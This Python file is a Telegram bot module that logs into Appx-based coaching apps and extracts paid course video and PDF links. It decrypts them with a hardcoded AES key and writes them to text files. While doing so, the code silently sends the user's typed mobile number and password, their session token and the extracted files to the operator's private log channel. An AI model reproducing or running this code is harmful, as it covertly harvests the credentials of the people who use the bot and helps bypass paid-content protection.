import requests
import threading 
import json
import cloudscraper
from pyrogram import filters
from Extractor import app
import os
import asyncio
import aiohttp
import base64
from Crypto.Cipher import AES
from Extractor.modules.mix import v2_new
from Crypto.Util.Padding import unpad
from base64 import b64decode
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import time 
import jwt
from config import PREMIUM_LOGS
from Extractor.modules.db import save_user_token

log_channel = PREMIUM_LOGS
log_channel2 = PREMIUM_LOGS

def decrypt(enc):
    enc = b64decode(enc.split(':')[0])
    key = '638udh3829162018'.encode('utf-8')
    iv = 'fedcba9876543210'.encode('utf-8')
    if len(enc) == 0:
        return ""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
    return plaintext.decode('utf-8')

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"
async def fetch(session, url, headers):
    try:
        async with session.get(url, headers=headers) as response:
            if response.status != 200:
                print(f"Error fetching {url}: {response.status}")
                return {}
            content = await response.text()
            
            soup = BeautifulSoup(content, 'html.parser')
            return json.loads(str(soup))
    except Exception as e:
        print(f"An error occurred while fetching {url}: {str(e)}")
        return {}


# async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
#     ti = topic.get("topicid")
#     tn = topic.get("topic_name")
    
#     url = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
#     r3 = await fetch(session, url, hdr1)
#     video_data = sorted(r3.get("data", []), key=lambda x: x.get("id"))  

    
#     tasks = [process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1) for video in video_data]
#     results = await asyncio.gather(*tasks)
    
#     return [line for lines in results if lines for line in lines]

# async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
#     vi = video.get("id")
#     vn = video.get("Title")
#     lines = []
    
#     try:
#         r4 = await fetch(session, f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0", hdr1)
        
#         if not r4 or not r4.get("data"):
#             print(f"Skipping video ID {vi}: No data found.")
#             return None

#         vt = r4.get("data", {}).get("Title", "")
#         vl = r4.get("data", {}).get("download_link", "")
#         fl = r4.get("data", {}).get("video_id", "")
        
#         if fl:
#             dfl = decrypt(fl)
#             final_link = f"https://youtu.be/{dfl}"
#             lines.append(f"{vt}:{final_link}\n")

#         if vl:
#             dvl = decrypt(vl)
#             if ".pdf" not in dvl: 
#                 lines.append(f"{vt}:{dvl}\n")
                 
#         else:
#             encrypted_links = r4.get("data", {}).get("encrypted_links", [])
#             if encrypted_links:
#                 first_link = encrypted_links[0]
#                 a = first_link.get("path")
#                 k = first_link.get("key")
#                 if a and k:
#                     da = decrypt(a)
#                     k1 = decrypt(k)
#                     k2 = decode_base64(k1)
#                     lines.append(f"{vt}:{da}*{k2}\n")
#                 elif a:
#                     da = decrypt(a)
#                     lines.append(f"{vt}:{da}\n")
        
#         if "material_type" in r4.get("data", {}):
#             mt = r4["data"]["material_type"]
#             if mt == "PDF":
#                 p1 = r4["data"].get("pdf_link", "")
#                 pk1 = r4["data"].get("pdf_encryption_key", "")
#                 p2 = r4["data"].get("pdf_link2", "")
#                 pk2 = r4["data"].get("pdf2_encryption_key", "")
                
#                 if p1 and pk1:
#                     dp1 = decrypt(p1)
#                     depk1 = decrypt(pk1)
#                     if depk1 == "abcdefg":
#                         lines.append(f"{vt}:{dp1}\n")
#                     else:
#                         lines.append(f"{vt}:{dp1}*{depk1}\n")
#                 if p2 and pk2:
#                     dp2 = decrypt(p2)
#                     depk2 = decrypt(pk2)
#                     if depk2 == "abcdefg":
#                         lines.append(f"{vt}:{dp2}\n")
#                     else:
#                         lines.append(f"{vt}:{dp2}*{depk2}\n")

        
#         if "material_type" in r4.get("data", {}):
#             mt = r4["data"]["material_type"]
#             if mt == "VIDEO":
#                 p1 = r4["data"].get("pdf_link", "")
#                 pk1 = r4["data"].get("pdf_encryption_key", "")
#                 p2 = r4["data"].get("pdf_link2", "")
#                 pk2 = r4["data"].get("pdf2_encryption_key", "")
                
#                 if p1 and pk1:
#                     dp1 = decrypt(p1)
#                     depk1 = decrypt(pk1)
#                     if depk1 == "abcdefg":
#                         lines.append(f"{vt}:{dp1}\n")
#                     else:
#                         lines.append(f"{vt}:{dp1}*{depk1}\n")
#                 if p2 and pk2:
#                     dp2 = decrypt(p2)
#                     depk2 = decrypt(pk2)
#                     if depk2 == "abcdefg":
#                         lines.append(f"{vt}:{dp2}\n")
#                     else:
#                         lines.append(f"{vt}:{dp2}*{depk2}\n")
                        
#         return lines
    
#     except Exception as e:
#         print(f"An error occurred while processing video ID {vi}: {str(e)}")
#         return None

async def handle_course(session, api_base, course_id, si, sn, topic, headers, userid, app_name):
    #si = subject.get("subjectid")
    #sn = subject.get("subject_name")

    ti = topic.get("topicid")
    tn = topic.get("topic_name")

    print(f"\n\n➡ ENTER TOPIC: {sn} -> {tn}")

    all_lines = []

    # -------------------------------------------
    # 1) GET CONCEPTS
    # -------------------------------------------
    concept_url = (
        f"{api_base}/get/allconceptfrmlivecourseclass"
        f"?courseid={course_id}&subjectid={si}&topicid={ti}&start=-1"
    )

    r_concept = await fetch(session, concept_url, headers)
    concepts = r_concept.get("data", []) or [{"conceptid": "-1", "concept_name": "All"}]

    for concept in concepts:
        ci = concept.get("conceptid") or "-1"
        cn = concept.get("concept_name", "Unknown")

        print(f"\n  ▶ ENTER CONCEPT: {cn}")

        # -------------------------------------------
        # 2) GET VIDEOS for this concept
        # -------------------------------------------
        list_url = (
            f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3"
            f"?courseid={course_id}&subjectid={si}&topicid={ti}&conceptid={ci}&start=0"
        )

        r_list = await fetch(session, list_url, headers)
        videos = r_list.get("data", []) or []

        videos = sorted(videos, key=lambda x: int(x.get("id", 0)))

        print(f"    found {len(videos)} videos")

        # -------------------------------------------
        # 3) process videos 1 by 1 (slow, no 429)
        # -------------------------------------------
        for idx, video in enumerate(videos, start=1):
            vid = video.get("id")

            print(f"      ▶ processing video [{idx}/{len(videos)}] ID={vid}")

            try:
                lines = await process_video(
                    session,
                    api_base,
                    course_id,
                    si,
                    sn,
                    ti,
                    tn,
                    video,
                    headers,
                    userid,
                    app_name
                )
        

                if lines:
                    all_lines.extend(lines)

            except Exception as e:
                print(f"      💣 Video {vid} failed: {e}")

        print(f"  ✔ concept done: {cn}")

    print(f"✔ topic complete: {tn}\n")
    return all_lines
async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1, userid, app_name):
    vi = video.get("id")
    vn = video.get("Title")
    lines = []
    
    try:
        r4 = await fetch(session, f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0", hdr1)
        
        if not r4 or not r4.get("data"):
            print(f"Skipping video ID {vi}: No data found.")
            return None

        vt = r4.get("data", {}).get("Title", "")
        vl = r4.get("data", {}).get("download_link", "")
        fl = r4.get("data", {}).get("video_id", "")
        
        if fl:
            dfl = decrypt(fl)
            final_link = f"https://youtu.be/{dfl}"
            lines.append(f"🗂️{vt}:{final_link}\n")

        if vl:
            dvl = decrypt(vl)
            if ".pdf" not in dvl: 
                lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.m3u8")
                 
        else:
            encrypted_links = r4.get("data", {}).get("encrypted_links", [])
            if encrypted_links:
                first_link = encrypted_links[0]
                a = first_link.get("path")
                k = first_link.get("key")
                if a and k:
                    da = decrypt(a)
                    k1 = decrypt(k)
                    k2 = decode_base64(k1)
                    lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.m3u8")
                elif a:
                    da = decrypt(a)
                    lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.m3u8")
        
        if "material_type" in r4.get("data", {}):
            mt = r4["data"]["material_type"]
            if mt == "PDF":
                p1 = r4["data"].get("pdf_link", "")
                pk1 = r4["data"].get("pdf_encryption_key", "")
                p2 = r4["data"].get("pdf_link2", "")
                pk2 = r4["data"].get("pdf2_encryption_key", "")
                
                if p1 and pk1:
                    dp1 = decrypt(p1)
                    depk1 = decrypt(pk1)
                    if depk1 == "abcdefg":
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                    else:
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                if p2 and pk2:
                    dp2 = decrypt(p2)
                    depk2 = decrypt(pk2)
                    if depk2 == "abcdefg":
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                    else:
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")

        
        if "material_type" in r4.get("data", {}):
            mt = r4["data"]["material_type"]
            if mt == "VIDEO":
                p1 = r4["data"].get("pdf_link", "")
                pk1 = r4["data"].get("pdf_encryption_key", "")
                p2 = r4["data"].get("pdf_link2", "")
                pk2 = r4["data"].get("pdf2_encryption_key", "")
                
                if p1 and pk1:
                    dp1 = decrypt(p1)
                    depk1 = decrypt(pk1)
                    if depk1 == "abcdefg":
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                    else:
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                if p2 and pk2:
                    dp2 = decrypt(p2)
                    depk2 = decrypt(pk2)
                    if depk2 == "abcdefg":
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                    else:
                        lines.append(f"{vt}:https://appxapi.co/{app_name}/{bi}/{vi}/{userid}.pdf")
                        
        return lines
    
    except Exception as e:
        print(f"An error occurred while processing video ID {vi}: {str(e)}")
        return None


            
            
THREADPOOL = ThreadPoolExecutor(max_workers=1000)
@app.on_message(filters.command(["appxm"]))

async def appex_v3_txt(app, message, api, name):
    
    api_base = api.replace("http://", "https://") if api.startswith(("http://", "https://")) else f"https://{api}"
    app_name = api_base.replace("http://", "").replace("https://", "").replace("api.classx.co.in","").replace("api.akamai.net.in", "").replace("apinew.teachx.in", "").replace("api.cloudflare.net.in", "").replace("api.appx.co.in", "").replace("/", "")
    
    
    input1 = await app.ask(message.chat.id, (f"SEND MOBILE NUMBER AND PASSWORD IN THIS FORMAT\n\n MOBILE*PASSWORD\n\nᴄᴏᴀᴄʜɪɴɢ ɴᴀᴍᴇ:- {app_name}\n\n OR SEND TOKEN"))
    
    raw_text = input1.text.strip()
    
    
    if '*' in raw_text:
        
        email, password = raw_text.split("*")
        raw_url = f"{api_base}/post/userLogin"
        headers = {
            "Auth-Key": "appxapi",
            "User-Id": "-2",
            "Authorization": "",
            "User_app_category": "",
            "Language": "en",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "okhttp/4.9.1"
        }
        data = {"email": email, "password": password}
        
        try:
            response = requests.post(raw_url, data=data, headers=headers).json()
            status = response.get("status")

            if status == 200:
    
                userid = response["data"]["userid"]
                token = response["data"]["token"]
                await save_user_token(userid, token)
            
            elif status == 203:
     
                second_api_url = f"{api_base}/post/userLogin?extra_details=0"
                second_headers = {
                    "auth-key": "appxapi",
                    "client-service": "Appx",
                    "source": "website",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                    "accept": "*/*",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
                }
                second_data = {
                    "source": "website",
                    "phone": email,
                    "email": email,
                    "password": password,
                    "extra_details": "1"
                }
                
                second_response = requests.post(second_api_url, headers=second_headers, data=second_data).json()
                if second_response.get("status") == 200:
                    userid = second_response["data"]["userid"]
                    token = second_response["data"]["token"]
                    await save_user_token(userid, token, api_base)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return await message.reply_text("Please try again later. Maybe Password Wrong")
                               


        hdr1 = {
            "Client-Service": "Appx",
            "source": "website",
            "Auth-Key": "appxapi",
            "Authorization": token,
            "User-ID": "1234"
        }
        
    else:
        
        token = raw_text
        userid = jwt.decode(token, options={"verify_signature": False}).get("id")

        hdr1 = {
            "Client-Service": "Appx",
            "source": "website",
            "Auth-Key": "appxapi",
            "Authorization": token,
            "User-ID": userid
            }  
        await save_user_token(userid, token, api_base)
        
        
    scraper = cloudscraper.create_scraper() 
    try:
        mc1 = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1).json()
        
        
        
    except json.JSONDecodeError as e:
        print(f"JSON decode error: {str(e)}")
        return await message.reply_text("Error decoding response from server. Please try again later.{e}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return await message.reply_text("An error occurred while fetching your courses. Please try again later.{e}")
    FFF = "𝗕𝗔𝗧𝗖𝗛 𝗜𝗗 ➤ 𝗕𝗔𝗧𝗖𝗛 𝗡𝗔𝗠𝗘\n\n"
    valid_ids = []

    if "data" in mc1 and mc1["data"]:
        for ct in mc1["data"]:
            ci = ct.get("id")
            cn = ct.get("course_name")
            cp = ct.get("course_thumbnail")
            start = ct.get("start_date")
            end = ct.get("end_date")
            pricing = ct.get("price")
            FFF += f"**`{ci}`   -   `{cn}`**\n\n"
            valid_ids.append(ci)
    else:
        try:
            async with session.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1) as res1:
                j1 = await res1.json()

                FFF = "COURSE-ID  -  COURSE NAME\n\n"
                
                valid_ids = []
                if"data" in j1 and j1["data"]:
                    for ct in j1["data"]:
                    	i = ct.get("id")
                    	cn = ct.get("course_name")
                    	start = ct.get("start_date")
                    	end = ct.get("end_date")
                    	pricing = ct.get("price")
                    	thumbnail = ct.get("course_thumbnail")
                    	
                    	FFF += f"**{i}   -   {cn}**\n\n"
                    	valid_ids.append(i)
                else:
                	
                	await message.reply_text("No course found in ID")
                return
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {str(e)}")
            return await message.reply_text("Error decoding response from server. Please try again later.")
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return await message.reply_text("NO BATCH PURCHASED")    

    dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n{FFF}")
    if len(FFF) <= 4096:
        await app.send_message(log_channel, dl)
        await app.send_message(log_channel2, f"`{token}`")
        editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")      
    else:
        plain_FFF = FFF.replace("**", "").replace("`", "")
        file_path = f"{app_name}.txt"
        with open(file_path, "w") as file:
            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name}\n\nToken: {token}\n\n{plain_FFF}")

        await app.send_document(
            message.chat.id,
            document=file_path,
            caption="Too many batches, so select batch IDs from the text file."
        )
        await app.send_document(log_channel, document=file_path, caption="Too many batches.")
    
        editable1 = None

# Ask for multiple batch IDs separated by '&'
    input2 = await app.ask(message.chat.id, "**Send multiple Course IDs separated by '&' to Download or copy below text to download all batches**\n\n`" + "&".join(valid_ids) + "`")

# Split the input into individual batch IDs
    batch_ids = input2.text.strip().split("&")

# Trim whitespace and filter invalid batch IDs
    batch_ids = [batch.strip() for batch in batch_ids if batch.strip() in valid_ids]

    if not batch_ids:
        await message.reply_text("**Invalid Course ID(s). Please send valid Course IDs from the list.**")
        await input2.delete(True)
        if editable1:
            await editable1.delete(True)
        return

    m1 = await message.reply_text("Processing your requested batches...")

# Process each batch ID one by one
    for raw_text2 in batch_ids:
        m2 = await message.reply_text(f"Extracting batch `{raw_text2}`...")
        start_time =time.time()
        try:
            r = scraper.get(f"{api_base}/get/course_by_id?id={raw_text2}", headers=hdr1).json()
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {str(e)}")
            await message.reply_text("Error decoding response from server. Please try again later.")
            continue
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            await message.reply_text("An error occurred while fetching the course details. Please try again later.")
            continue

        if not r.get("data"):
            course_name = next((ct.get("course_name") for ct in mc1["data"] if ct.get("id") == raw_text2), "Course")
            sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
        
            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
            continue

        for i in r.get("data", []):
            txtn = i.get("course_name")
            filename = f"{raw_text2}_{txtn.replace(':', '_').replace('/', '_')}.txt"

            if '/' in filename:
                filename1 = filename.replace("/", "").replace(" ", "_")
            else:
                filename1 = filename
            
            async with aiohttp.ClientSession() as session:
                with open(filename1, 'w') as f:
                    try:
                        r1 = await fetch(session, f"{api_base}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}&start=-1", hdr1)
            
                        for subject in r1.get("data", []):
                            si = subject.get("subjectid")
                            sn = subject.get("subject_name")

                            r2 = await fetch(session, f"{api_base}/get/alltopicfrmlivecourseclass?courseid={raw_text2}&subjectid={si}&start=-1", hdr1)
                            topics = sorted(r2.get("data", []), key=lambda x: x.get("topicid"))

                            tasks = [handle_course(session, api_base, raw_text2, si, sn, t, hdr1, userid, app_name) for t in topics]
                            all_data = await asyncio.gather(*tasks)
                
                            for data in all_data:
                                if data:
                                    f.writelines(data)
        
                    except Exception as e:
                        print(f"An error occurred while processing the course: {str(e)}")
                        await message.reply_text("An error occurred while processing the course. Please try again later.")
                        continue
                    
                end_time = time.time()
                elapsed_time = end_time - start_time
                print(f"Elapsed time: {elapsed_time:.1f} seconds")
                np = filename1
            
                c_text = (
                    f"**APP NAME: <b>{app_name}</b>**\n"
                    f"**BatchName:** {raw_text2}_{txtn}\n"
                    f"**Validity Start:**{start}\n"
                    f"**Validity Ends:**{end}\n"
                    f"Elapsed time: {elapsed_time:.1f} seconds\n"
                    f"**Batch Price:** {pricing}\n"
                    f"**course_thumbnail:** <a href={cp}>Thumbnail</a>"
                )
            
                try:
                    await input2.delete(True)
                    await m1.delete(True)
                    await m2.delete(True)
                    await app.send_document(message.chat.id, filename1, caption=c_text)
                    await app.send_document(log_channel, filename1, caption=c_text)
                    
            
                except Exception as e:
                    print(f"An error occurred while sending the document: {str(e)}")
                
                    course_name = next((ct.get("course_name") for ct in mc1["data"] if ct.get("id") == raw_text2), "Course")
                    sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
                    await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
                finally:
                    if os.path.exists(filename1):
                        os.remove(filename1)
